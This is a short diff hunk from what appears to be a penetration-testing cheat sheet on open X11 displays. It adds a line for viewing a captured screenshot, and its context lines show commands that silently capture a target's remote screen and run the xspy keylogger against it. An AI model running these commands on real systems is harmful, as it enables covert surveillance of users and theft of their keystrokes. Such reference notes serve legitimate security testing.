@@ -809,6 +809,7 @@ xwininfo -root -tree -display <target IP:display #>
 - Capture screenshot
 xwd -root -screen -silent -display <target IP:display #> > 1.xwd
 convert 1.xwd 1.png
+display 1.png
 
 - Keylogger
 xspy -display <target IP:display #>
